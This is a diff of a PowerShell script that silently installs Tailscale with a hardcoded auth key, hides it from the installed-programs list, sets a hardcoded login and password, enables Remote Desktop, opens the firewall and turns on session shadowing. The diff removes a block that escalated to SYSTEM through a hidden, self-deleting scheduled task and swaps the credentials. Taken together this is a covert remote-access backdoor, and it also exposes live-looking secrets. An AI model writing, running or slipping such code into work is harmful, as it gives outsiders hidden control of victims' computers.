@@ -1,19 +1,9 @@
-if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -notlike '*SYSTEM*') {
-    $script = $MyInvocation.MyCommand.Path
-    if (-not $script) { $script = 'C:\Windows\Temp\install.ps1' }
-    $taskName = 'TS' + (Get-Random -Max 9999)
-    schtasks /create /tn $taskName /tr "powershell -NoP -EP Bypass -Window Hidden -File `"$script`"" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f | Out-Null
-    schtasks /run /tn $taskName | Out-Null
-    Start-Sleep -Seconds 3
-    schtasks /delete /tn $taskName /f | Out-Null
-    exit
-}
 $authKey = 'tskey-auth-kHTAvGMNLv11CNTRL-rSdgDacPQ1DWeSRUtSRs1DstWjMhTYSAA'
 $msiPath = "$env:TEMP\tailscale.msi"
 $downloadUrl = 'https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi'
 $tailscaleExe = 'C:\Program Files\Tailscale\tailscale.exe'
-$user = 'Adminuser'
-$password = 'shansnow89'
+$user = 'Login'
+$password = 'blackpair007'
 curl.exe -L -o $msiPath $downloadUrl 2>$null
 Start-Process msiexec -ArgumentList "/i `"$msiPath`" /qn /norestart ARPSYSTEMCOMPONENT=1" -Wait -NoNewWindow
 Remove-Item $msiPath -Force -ErrorAction 0
@@ -42,5 +32,3 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -Type DWord -Force
 netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" -Name "Shadow" -Value 2 -Type DWord -Force
-gpupdate /force 2>$null
-Restart-Service TermService -Force -ErrorAction 0
